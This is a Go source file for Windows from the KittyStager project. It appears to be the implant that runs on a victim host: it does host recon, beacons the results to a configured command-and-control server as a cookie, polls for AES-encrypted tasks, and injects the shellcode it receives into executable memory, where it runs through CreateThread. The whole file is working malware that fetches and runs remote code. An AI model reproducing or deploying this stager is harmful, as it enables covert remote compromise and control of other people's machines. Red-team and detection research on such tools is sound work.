//go:build windows

package main

import (
	"KittyStager/cmd/cryptoUtil"
	"KittyStager/cmd/malwareUtil"
	"KittyStager/cmd/util"
	_ "embed"
	b64 "encoding/base64"
	"encoding/hex"
	"fmt"
	"golang.org/x/sys/windows"
	"strconv"
	"strings"
)

//go:embed conf.txt
var t string

var (
	sleepTime  int
	body       []byte
	initChecks util.InitialChecks
)

func main() {
	//get the shellcode by http
	conf := strings.Split(t, ",")
	sleepTime, _ = strconv.Atoi(conf[2])
	//initial recon
	host := malwareUtil.Recon()
	initChecks, _ = util.UnmarshalJSON(host)
	cookie := b64.StdEncoding.EncodeToString(host)
	cookieName := initChecks.GetKittenName()
	//initial request
	var err error
	// try to connect to the server
	for {
		body, err = malwareUtil.Request(cookie, conf)
		if err != nil {
			malwareUtil.Sleep(sleepTime)
		} else {
			break
		}
	}
	for {
		body, err = malwareUtil.Request(cookieName, conf)
		// if the response is not a shellcode, sleep and try again
		if len(body) < 10 {
			malwareUtil.Sleep(sleepTime)
		} else {
			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
			hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
			task, _ := malwareUtil.UnmarshalJSON(hexSc)
			switch task.Tag {
			case "shellcode":
				shellcode, _ := hex.DecodeString(string(task.Payload))
				//inject the shellcode
				inject(shellcode)
				return
			case "sleep":
				fmt.Println("sleeping", string(task.Payload))
				sleepTime, _ = strconv.Atoi(string(task.Payload))
				malwareUtil.Sleep(sleepTime)
			}
		}
		fmt.Println("body :", string(body))
	}
}

func inject(shellcode []byte) {

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createThread := kernel32.NewProc("CreateThread")

	shellcodeExec, _ := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)

	malwareUtil.Memcpy(shellcodeExec, shellcode)

	var oldProtect uint32
	windows.VirtualProtect(
		shellcodeExec,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect)

	hThread, _, _ := createThread.Call(
		0,
		0,
		shellcodeExec,
		uintptr(0),
		0,
		0)

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		windows.INFINITE)
}
